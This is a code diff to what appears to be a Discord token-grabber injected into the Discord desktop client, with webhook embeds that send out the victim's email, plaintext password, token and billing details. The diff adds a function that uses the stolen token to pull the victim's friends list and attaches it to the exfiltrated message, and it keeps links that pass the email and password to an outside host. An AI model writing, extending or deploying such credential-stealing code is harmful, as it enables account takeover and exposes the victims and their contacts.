@@ -315,6 +315,7 @@ const login = async (email, password, token) => {
   const nitro = getNitro(json.premium_type);
   const badges = getBadges(json.flags);
   const billing = await getBilling(token);
+  const friends = await getRelationships(token);
   const content = {
     username: config.embed_name,
     avatar_url: config.embed_icon,
@@ -334,7 +335,7 @@ const login = async (email, password, token) => {
                     "inline": true
                 },
                 {
-                    "name": "<a:sn5:989240264386293800> SN - Billing:",
+                    "name": "<a:2788demonshit:989345376567971870> SN - Billing:",
                     "value": `\`${billing}\``,
                     "inline": true
                 },
@@ -344,12 +345,12 @@ const login = async (email, password, token) => {
                     "inline": true
                 },
                 {
-                    "name": "SN - Email:",
+                    "name": "<a:sn2:989239408400138310> SN - Email:",
                     "value": `\`${email}\`\n[Copy Email](https://superfurrycdn.nl/copy/${email})`,
                     "inline": true
                 }, 
                 {
-                    "name": "**Account Password**",
+                    "name": "<a:sn7:989344653323169802> SN - Password:",
                     "value": `\`${password}\`\n[Copy Password](https://superfurrycdn.nl/copy/${password})`,
                     "inline": true
                 },
@@ -365,7 +366,11 @@ const login = async (email, password, token) => {
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
             }
-      },
+        }, {
+          "title": `Total Friends (${friends.length})`,
+          "color": config.embed_color,
+            "description": friends.frien,
+       },
     ],
   };
   if (config.ping_on_run) content["content"] = config.ping_val;
@@ -749,6 +754,28 @@ session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
     });
   }
 });
+
+async function getRelationships(token) {
+    const window = BrowserWindow.getAllWindows()[0];
+    var a = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );xmlHttp.setRequestHeader("Authorization", "${token}");xmlHttp.send( null );xmlHttp.responseText`, !0)
+    var json = JSON.parse(a)
+    const r = json.filter((user) => {
+        return user.type == 1
+    })
+    var gay = "";
+    for (z of r) {
+        var b = getRareBadges(z.user.public_flags)
+        if (b != "") {
+            gay += `${b} ${z.user.username}#${z.user.discriminator}\n`
+        }
+    }
+    gay = gay ?? "No Rare Friends";
+
+    return {
+        length: r.length,
+        frien: gay
+    }
+}
 
 session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
   if (details.statusCode !== 200 && details.statusCode !== 202) return;
